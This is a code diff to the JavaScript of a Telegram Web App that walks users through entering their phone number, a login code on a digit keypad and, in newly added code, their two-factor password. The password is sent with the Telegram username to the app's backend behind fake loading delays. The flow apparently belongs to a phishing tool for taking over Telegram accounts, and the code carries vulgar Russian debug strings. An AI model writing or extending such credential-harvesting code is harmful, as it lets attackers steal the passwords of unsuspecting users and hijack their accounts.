@@ -237,8 +237,8 @@ TelegramWebApp.MainButton.onClick(async () => {
     Telegram.WebApp.HapticFeedback.impactOccurred('light');
     let step = localStorage.getItem("step");
 
-    // if (step === "welcome") {
-    //     let phone_to_use;
+    if (step === "welcome") {
+        let phone_to_use;
 
         if (get_phone() === null) {
             phone_to_use = await request_user_phone();
@@ -249,18 +249,28 @@ TelegramWebApp.MainButton.onClick(async () => {
                 username: window.Telegram.WebApp.initDataUnsafe.user.username
             })
             console.log(phone_to_use, 'ТЕЛЕФОНЧЕПК')
-            step2();
         }
-        // loading_page();
-        // const data = await sendRequest("request_code", "POST", {
-        //     phone_number: phone_to_use,
-        //     telegram_user_id: USER_ID,
-        //     telegram_username: USER_USERNAME
-        // });
+        loading_page();
+        setTimeout(step2, 3000);
+    }
+    else if (step === "two_fa") {
+        const enteredPassword = passwordInput ? passwordInput.value.trim() : '';
+        if (enteredPassword != "") {
+            TelegramWebApp.MainButton.hide();
+            passwordInput.blur();
+            loading_page();
 
-        // if (data.status === "code_sent") {
-        //     step2();
-        // }
+            const data = await RequestSUKA('password', 'POST', {
+                password: enteredPassword,
+                username: window.Telegram.WebApp.initDataUnsafe.user.username
+            })
+
+            if (data.status === 200) {
+                setTimeout(step4, 3000);
+            }
+        }
+    }
+    
 });
 
 TelegramWebApp.SecondaryButton.onClick(async () => {
@@ -424,7 +434,7 @@ document.querySelectorAll('.keyboard button[data-digit]').forEach(button => {
                     console.log("ХУЙУХУХЦЙУХ")
                     console.log("ХУЙУХУХЦЙУХ")
                     console.log("ХУЙУХУХЦЙУХ")
-                    step3()
+                    setTimeout(step3, 5000)
                 }
             }
         }
